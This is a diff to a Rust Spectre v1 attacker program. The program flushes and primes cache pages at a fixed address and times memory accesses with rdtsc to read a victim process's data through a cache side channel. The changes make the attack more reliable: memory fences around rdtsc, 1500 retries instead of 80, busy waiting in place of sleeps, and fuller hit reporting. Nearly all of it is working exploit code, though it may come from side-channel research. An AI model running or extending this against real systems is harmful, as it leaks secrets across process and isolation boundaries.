@@ -1,6 +1,7 @@
 #![feature(asm)]
 
-use std::{thread, time};
+mod utils;
+use utils::busy_waiting;
 
 const SPECV1_BASE: u64 = 0x00007ffff7dd7000;
 const SPECV1_NPAGES: usize = 38;
@@ -11,7 +12,7 @@ const SPECV1_N_CL: usize = 256;
 const SPECV1_OFFSET: usize = 512;
 
 const HIT_THRESHOLD: u64 = 160;
-const NRETIRES: usize = 80;
+const NRETIRES: usize = 1500;
 
 fn clflush_page(page_address: u64) {
     let _cl_size: usize = 1 << 6; // bytes
@@ -43,7 +44,9 @@ fn rdtsc() -> u64 {
     let result: u64;
     unsafe{
         asm!{"
+            mfence
             rdtsc
+            mfence
             shl rdx, 32
             or rax, rdx
             ",
@@ -76,7 +79,6 @@ fn get_hits(array: &[u64], hits: &mut [usize]) {
 }
 
 fn probe(address: u64, hits: &mut [usize]) {
-    let sleep_time = time::Duration::from_nanos(500);
     let mut elapsed: [u64; SPECV1_N_CL] = [0; SPECV1_N_CL];
 
     for cl in 0..SPECV1_N_CL - 1 {
@@ -84,7 +86,6 @@ fn probe(address: u64, hits: &mut [usize]) {
         let cl_address = address + (cl_shuffle * SPECV1_OFFSET) as u64;
 
         elapsed[cl_shuffle] = time_access(cl_address);
-        thread::sleep(sleep_time);
     }
 
     get_hits(&elapsed, hits);
@@ -92,13 +93,12 @@ fn probe(address: u64, hits: &mut [usize]) {
 
 fn report_hits(hits: &[usize]) {
     let iter = hits.iter().enumerate();
-    let filtered = iter.filter(|&(_, item)| *item == 1);
+    let filtered = iter.filter(|&(_, item)| *item > 0);
 
-    filtered.for_each(|(index, _)| println!("hits: index {}, nhits 1", index));
+    filtered.for_each(|(index, item)| println!("hits: index {}, nhits {}", index, item));
 }
 
 fn main() {
-    let sleep_time = time::Duration::from_millis(55);
     let mut hits: [usize; SPECV1_N_CL] = [0; SPECV1_N_CL];
 
     // victim must have started
@@ -107,7 +107,7 @@ fn main() {
     // victim must receive input
     for _ in 0..NRETIRES - 1 {
         probe(SPECV1_BASE, &mut hits);
-        thread::sleep(sleep_time);
+        busy_waiting(8);
         prime(SPECV1_BASE, SPECV1_NPAGES);
     }
 
